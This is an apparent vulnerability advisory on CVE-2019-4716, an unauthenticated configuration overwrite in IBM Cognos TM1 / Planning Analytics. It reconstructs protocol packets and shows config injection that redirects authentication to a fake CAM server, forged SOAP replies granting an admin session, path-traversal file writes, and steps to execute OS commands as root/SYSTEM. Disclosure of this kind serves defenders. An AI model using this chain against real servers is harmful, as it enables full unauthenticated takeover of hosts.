# Configuration Overwrite (leading to remote code execution) in IBM Cognos TM1 / IBM Planning Analytics Server

### By Pedro Ribeiro (pedrib@gmail.com | [@pedrib1337](https://twitter.com/pedrib1337)) from [Agile Information Security](https://agileinfosec.co.uk)

#### Disclosure Date: 2019-12-17 | Last updated: 2020-05-09 

* [Summary](#summary)
* [Technical Introduction](#technical-introduction)
* [Vulnerability Details](#vulnerability-details)
    * [Configuration Overwrite](#configuration-overwrite)
    * [Bypassing Authentication](#bypassing-authentication)
    * [Achieving Code Execution](#achieving-code-execution)
* [Fixes / Mitigations](#fixes--mitigations)

## Product Information
[IBM Planning Analytics](https://www.ibm.com/products/planning-analytics), powered by IBM TM1, is an integrated planning solution designed to promote collaboration across the organization and help keep pace with the speed of modern business. With a powerful calculation engine, this enterprise performance management solution helps you move beyond the limits of spreadsheets, automating the planning process to drive faster, more accurate results. Simplify oceans of data by unifying data sources into one single repository and empowering users to build sophisticated, multidimensional models that drive more reliable forecasts. 

## Summary

**tl;dr scroll down to the bottom for an asciinema of the exploit in action**

[IBM Cognos TM1 Server / Planning Analytics Server (**TM1**)](https://www.ibm.com/products/planning-analytics) is an Enterprise Resource Planning (ERP) software, currently being developed by IBM, which has been in existence since 1983. TM1 provides complex primitives to process data from several different sources, query and display it in Excel spreadsheets, graphs, etc.

TM1 has two main components: the Admin server and the Application server(s). The Admin server stores information about the location and configuration details of Application servers. Each application is deployed in its own Application server. An application is a collection of data, objects and processes, which can be queried and modified in a number of ways through client programs such as [IBM TM1 Architect](https://www.ibm.com/support/knowledgecenter/SSD29G_2.0.0/com.ibm.swg.ba.cognos.tm1_cloud_mg.2.0.0.doc/c_tm1_cloud_tm1architect.html), a REST API, remote scripts, etc. TM1 server can be run on Windows or Linux operating systems.

The vulnerability described in this advisory affects the Application server component. The Application server requires authentication to perform most functions, but this vulnerability can be exploited pre-authentication. 

**The critical vulnerability is a configuration overwrite that allows an unauthenticated user to modify authentication parameters, login as "admin", and then execute code as root or SYSTEM** with the built-in TM1 script interpreter. This vulnerability has been assigned [CVE-2019-4716](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-4716), and was fixed with the release of IBM Planning Analytics 2.0.9 on 17th of December 2019 (refer to the [IBM advisory for details](https://www.ibm.com/support/pages/node/1127781)).

A Metasploit exploit module that abuses this vulnerability [was released and integrated](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/ibm_tm1_unauth_rce.rb) into the framework. This exploit was tested and confirmed to be working on all TM1 versions until at least 10.2.2, released in 2014. It is likely that older versions, possibly up to 8.X, are also vulnerable. 
Readers are encouraged to contact the author to share exploitation tales and success stories.

A special thanks to [CERT/CC](https://www.kb.cert.org/vuls/) for assisting with the disclosure of this vulnerability, and to Gareth Batchelor of Cloudtrace for doing real world testing of the exploit.


## Technical Introduction
The TM1 Application server and Admin server communicate between themselves and between client applications in two ways: either through a REST API or through a binary protocol. The REST API is optional but the binary protocol is set up by default upon installation.

The binary protocol message layout is described below:

```
packet_size      (2 bytes)     sizeof(packet_header + message_type + message_data + packet_end)
packet_header    (4 bytes)     [ 0, 0, 0xff, 0xff ]
message_type     (2 bytes)     0x1 to 0x1e2
message_data     (X bytes)     actual message
packet_end       (2 bytes)     [ 0xff, 0xff ]
```

The *message_type* component contains the identification number of the remote method being invoked, while *message_data* will vary for each remote method. 
For example, an authentication request is as follows:

```ruby
auth_packet = 
  packet_size 
  packet_header
  message_type_auth
  empty_auth_obj
  application_name
  username 
  password
  client_ip 
  auth_trailer
  packet_end
```

All of the components defined above, except for *packet_size, packet_header, message_type_auth* and *packet_end*, are encapsulated in defined protocol objects.
For example, if the application we are sending a message to is called app, the *application_name* component would look like this:

```[ 0xe, 0, 3, 0x61, 0x70, 0x70 ]```

0xe indicates the object type, which is a string. The next two bytes are the size of the string - 0x03 bytes in total, and the remaining bytes are the ASCII codes for "app".

The following objects are defined in the protocol:

```
0x2: ASCII string
0x3: Index
0x4: Boolean
0x5: Object Pointer
0x7: Array
0xe: UTF8 string
0xf: binary string
```

Most object types are self explanatory, except for the *Object Pointer*. While the name seems very interesting from an exploitation point of view, this type does not represent a pointer in memory, but simply a numeric reference to a remote object that is created in the server.

Note that the protocol was not reversed extensively, just enough to achieve exploitation of the vulnerability described in this advisory. There are plenty of details that were not researched due to lack of time.

Going back to the authentication request, the actual packet data would look like this:

```ruby
auth_packet =
  # packet_size  
  sizeof(auth_packet)
  
  # packet_header
  [ 0, 0, 0xff, 0xff ]
  
  # message_type_auth
  [ 0, 1 ] 

  # empty_auth_obj
  [ 5, 3, 0, 0, 0, 0, 0, 0, 0 ]

  # application_name ("app")
  [ 0xe, 0, 3, 0x61, 0x70, 0x70 ]

  # username ("admin")
  [ 0xe, 0, 5, 0x61, 0x64, 0x6d, 0x69, 0x6e ]

  # password (encoded)
  [ 0xf, 0, 5, 0xfa, 0x64, 0x78, 0x7b, 0xad ]

  # client_ip
  [ 0xe, 0, 7, 0x31, 0x2e, 0x31, 0x2e, 0x31, 0x2e, 0x31 ]

  # client_version
  [ 3, 6, 0x94, 0x92, 0x00 ]

  # packet_end
  [ 0xff, 0xff ]
```

Of the objects above, we will go through the ones that are not self-explanatory, starting with *empty_auth_object*.
In a message that would call another function (different *message_type*), *empty_auth_object* would contain a object number used by the server to verify authentication (see *auth_object* in the next protocol packet example). This object number is essentially a session identifier returned upon successful authentication, and sent by the client in every subsequent request. Since in the example we are invoking the authentication function, we can send an empty object (as we do not have a session identifier yet).

The password is encoded as a binary string. *client_version* is a hex number that specifies the version of the client performing the login: 0x6949200 = 110400000, or version 11.4 in this case.

If this authentication request was successful, the server would return the following:

```ruby
auth_response =
  # packet_size
  sizeof(auth_response)

  # packet_header
  [ 0, 0, 0xff, 0xff ] 

  # auth_object
  [ 5, 3, 0xc3, 0x80, 0, 0xe, 0xdd, 0, 0 ]

  # packet_end
  [ 0, 0 ]
```

After receiving this packet, the client would then be able to call other functions in the server by providing the *auth_object* (the session identifier) returned by the server in this message.

The TM1 protocol contains several authentication methods. The one that was just described is the simplest one, a username and password combination. There is another method that authenticates with LDAP, another with certificates, Kerberos, etc. 

These methods can obviously be called pre-authentication; however there are a handful of other methods that can be called before authenticating to the server. Most of these are harmless, but as we will see in the Vulnerability Details, there is one in particular that can be abused.

The protocol is complex, but the details described above are enough to understand the vulnerability described in this advisory. 
The REST API was not explored in much detail, and the binary protocol was chosen as the focus of this research. This is because the binary protocol is enabled by default and mandatory, unlike the REST API. 

The function names listed in this advisory are symbols in the "tm1s.exe" binary from a Linux installation of IBM Planning Analytics 2.0.6, which is the binary that runs the Application server instances. The Application server configuration resides in the "tm1s.cfg" file that lives in the same directory as the application data. 

Application servers can run on arbitrary ports and use arbitrary names. However, the names, ports and TLS configuration of Application server instances can be obtained by querying the Admin server without authentication, as the other Cognos client / desktop applications do, and this is actually used in the [exploit released with this advisory](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/ibm_tm1_unauth_rce.rb).

## Vulnerability Details
### Configuration Overwrite
* [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
* [CVE-2019-4716](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-4716)
* Risk Classification: Critical
* Attack Vector: Remote
* Constraints: None / N/A
* Affected products / versions:
    * IBM Cognos TM1 versions 10.2.2 (older versions as low as 8.X might be vulnerable)
    * IBM Planning Analytics versions <= 2.0.8

One of the remote methods that can be called pre-authentication is named *sv_ProcessUpdateFromCentral()* (*message_type* 0x1ae). The purpose of this method is to update application data and server variables according to the requests of a central server when TM1 is deployed in distributed mode.  These variables control critical configuration parameters as we will see below.

The packet format is as follows:

```ruby
update_packet =
  # packet_header         
  [ 0, 0, 0xff, 0xff ]

  # message_type_update
  [ 0x1, 0xae ]

  # empty_auth_obj
  [ 5, 3, 0, 0, 0, 0, 0, 0, 0 ]

  # defines an Array of 7 elements
  [ 7, 0, 0, 0, 7 ]

  # first array object, Index (required; unknown why but fixed value seems to work)
  [ 3, 0, 0, 0, 2 ]
  
  # second array object, Index (required; unknown why but fixed value seems to work)
  [ 3, 0, 0, 0, 2 ]
  
  # third array object, Index (required; unknown why but fixed value seems to work)
  [ 3, 0, 0, 0, 2 ]

  # application_name ("app"); however it can be a random string
  [ 0xe, 0, 3, 0x61, 0x70, 0x70 ]

  # file_name ("tm1s_delta.cfg")
  [ 0xe, 0, 0xa, 0x74, 0x6d, 0x31, 0x73, 0x5f, 0x64, 0x65, 0x6c, 0x74, 0x61, 0x2e, 0x63, 0x66, 0x67 ]

  # file_data, binary type 0xf
  <FILE_DATA>

  # timestamp, string type 0xe; can be a random string
  <RANDOM>
  
  # packet_end                     
  [ 0xff, 0xff ]
```

The *file_name* object above was set to "tm1s_delta.cfg" as that is what the remote method expects. If that *file_name* is provided, the server will read the *file_data* object, process its configuration updates and delete the file. This is done through a series of function calls: 

```ruby
# message_type 0x1ae invokes this function
sv_ProcessUpdateFromCentral()

    # file_data is created and deleted here, application variables are processed
    ProcessAllUpdates()
    
        # if a tm1s_delta.cfg file was sent, process it
        MergeDynamicConfigParameters()
        
            # ... and update server variables
            srv_Config()
```

If a different file name is provided, file_data will not be processed; however it will still be written to disk under <app_base\>/data/}distributedupdates/<file_name\> as root and with execute permissions, but will deleted as soon as the method terminates. 

Luckily for the attacker, if we insert path traversal characters "../../" in the file_name, the file will be written to other directories and it will not be deleted when the remote method terminates.

There are multiple ways to exploit this vulnerability. Firstly, there is a clear race condition described above. This could be exploited by replacing */etc/shadow* on Linux and logging in via SSH or by dropping a file in the TM1 Java REST server and executing it.

Secondly, we can update several global configuration variables, which are copied into the globals section of the tm1s.exe binary. From then on, they are used in several other functions, and these functions blindly trust the data in the global variables with few length checks, meaning it is possible to find and exploit several buffer overflows in this way. 

In the end, it was decided to actually use the [built-in server TM1 scripting](https://www.ibm.com/support/knowledgecenter/en/SSD29G_2.0.0/com.ibm.swg.ba.cognos.tm1_ref.2.0.0.doc/c_tm1turbointegratorfunctions_n70006.html) to achieve unauthenticated remote code execution in a reliable way without memory corruption, so that the exploit doesn't need modification for different versions and platforms.

### Bypassing Authentication
There are several methods to authenticate to the Application servers. A simple user / password combo can be configured, LDAP authentication, Kerberos authentication, etc. This is controlled by the variable "IntegratedSecurityMode", which is set in the "tm1s.cfg" Application server configuration file, which can be modified as per the method described previously. 

The "CAM" authentication method is a [SOAP](https://en.wikipedia.org/wiki/SOAP) based protocol unique to TM1. Using the configuration variable overwriting, we can modify several values to force the Application server to authenticate to a CAM server that we control.

To authenticate and impersonate any user in the server we need to:

1. start a "fake" CAM server
2. modify the configuration in TM1 to authenticate using CAM, and point it to our fake CAM server
3. authenticate to TM1 using the CAM method
4. fake CAM server responds with valid account and session objects for a pre-existing account in the server (such as "admin")
5. TM1 grants us a session identifier (*auth_object*)

Step 1 is simple; we need to start a SOAP server that responds in accordance to the CAM protocol. More on that below.

In step 2, we need to modify / inject the following configuration variables in "tm1s.cfg":

```
IntegratedSecurityMode=4
ServerCAMURI=http://<HOST>:<PORT>
ServerCAMURIRetryAttempts=10
ServerCAMIPVersion=ipv4
CAMUseSSL=F
```

In step 3, we authenticate using *message_type_cam* (0x8), which invokes the *sv_SystemServerConnectWithCAMPassport()* function.    
    
This authentication call will call several other functions which will trigger three requests to our CAM server that we set up in step 1.

Starting step 4, in the first request, the CAM server has to answer with the account info, containing a valid username:

```xml
<item xsi:type="bus:account">
  <defaultName><value>admin</value></defaultName>
</item>
```

In the second request, the CAM server has to reply with the session info, which again has to contain a valid username:

```xml
<item xsi:type="bus:session">
  <identity>
    <value baseClassArray xsi:type="SOAP-ENC:Array" SOAP-ENC:arrayType="tns:baseClass[3]">
      <item xsi:type="bus:account">
        <searchPath><value>admin</value></searchPath>
      </item>
    </value>
  </identity>
</item>
```

As for the third request, we can send random data inside the SOAP envelope, as it is not needed for successful authentication.

Finally, if the username we provided in the XML returned by the CAM server exists in the Application server ("admin" is a safe bet since it has administrative privileges and always exists), in step 5 we get a valid *auth_object* such as:

```[ 5, 3, 0xc3, 0x80, 0, 0xe, 0xdd, 0, 0 ]```

A simplified call tree is shown below:

```ruby
# function invoked with message_type_cam (0x8)
sv_SystemServerConnectWithCAMPassport()

    # sets up CAM server URL, SSL and connection properties
    GetClientWithCAMPassport()
    
        # calls the CAM server twice and returns a CT1CAMUser object
        CreateCAMUser()
        
            # performs a third call to the CAM server, which can be ignored
            QueryNameSpace()
            
                # fetches a TM1Client object with the CT1CAMUser username
                GetClientByName()
                
# <--- if GetClientByName() succeeds, returns an auth_object
```

### Achieving Code Execution:

Once we are authenticated as "admin", achieving remote code execution is easy. One of the remote methods that can only be invoked by administrators is *sv_ProcessExecuteEx()* (*message_type* 0xc4), which despite the name does not execute operating system processes, but executes [TM1 language scripts](https://www.ibm.com/support/knowledgecenter/en/SSD29G_2.0.0/com.ibm.swg.ba.cognos.tm1_ref.2.0.0.doc/c_tm1turbointegratorfunctions_n70006.html) which [can be defined by the user](https://www.ibm.com/support/knowledgecenter/SSD29G_2.0.0/com.ibm.swg.ba.cognos.tm1_ref.2.0.0.doc/r_tm1_ref_tifun_executeprocess.html?view=embed). 

However TM1 has a script language primitive named ["ExecuteCommand"](https://www.ibm.com/support/knowledgecenter/SSD29G_2.0.0/com.ibm.swg.ba.cognos.tm1_ref.2.0.0.doc/r_tm1_ref_tifun_executecommand.html?view=embed), which will indeed execute operating system commands as the TM1 server user, which is root in Linux and SYSTEM in Windows.

In order to achieve command execution we need to:

1. create a TM1 script Process object in the server by invoking *sv_ProcessCreateEmpty()* (*message_type* 0x9c)
2. add the ExecuteCommand primitive, and our command inside in the Process object by invoking *sv_ObjectPropertySet()* (*message_type* 0x25)
3. register the Process object on the server by invoking *sv_ObjectRegister()* (*message_type* 0x21)
4. invoke the Process object with *sv_ProcessExecuteEx()* (*message_type* 0xc4)

... which will then execute our command, resulting in the complete compromise of the TM1 server host by an unauthenticated attacker.

The only thing left to say is that in the [exploit released with this advisory](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/ibm_tm1_unauth_rce.rb), we initially retrieve the current authentication method by querying the server status (*message_type_config*, 0x135). At the end of the exploit, after we have achieved code execution, we clean up the variables we set up and restore the original authentication method.

Due to the complexity of the protocol and exploit, many details were left out of this advisory in order to facilitate comprehension. More insight can be gained by reading the publicly released exploit.

And with that said, here is an asciinema of the exploit in action:

[![asciicast](https://asciinema.org/a/328336.svg)](https://asciinema.org/a/328336)



## Fixes / Mitigations:
- Follow [IBM's recommendations](https://www.ibm.com/support/pages/node/1127781) and upgrade to IBM Planning Analytics 2.0.9.
- Do not expose TM1 / Planning Analytics to the Internet or untrusted networks.

## Disclaimer
Please note that Agile Information Security Limited (Agile InfoSec) relies on information provided by the vendor / product manufacturer when listing fixed versions, products or releases. Agile InfoSec does not verify this information, except when specifically mentioned in the advisory text and requested or contracted by the vendor to do so.
Unconfirmed vendor fixes might be ineffective, incomplete or easy to bypass and it is the vendor's responsibility to ensure all the vulnerabilities found by Agile InfoSec are resolved properly. Agile InfoSec usually provides the information in its advisories free of charge to the vendor, as well as a minimum of six months for the vendor to resolve the vulnerabilities identified in its advisories before they are made public.
Agile InfoSec does not accept any responsibility, financial or otherwise, from any material losses, loss of life or reputational loss as a result of misuse of the information or code contained or mentioned in its advisories. It is the vendor's responsibility to ensure their products' security before, during and after release to market.

## License
All information, code and binary data in this advisory is released to the public under the [GNU General Public License, version 3 (GPLv3)](https://www.gnu.org/licenses/gpl-3.0.en.html). For information, code or binary data obtained from other sources that has a license which is incompatible with GPLv3, the original license prevails.

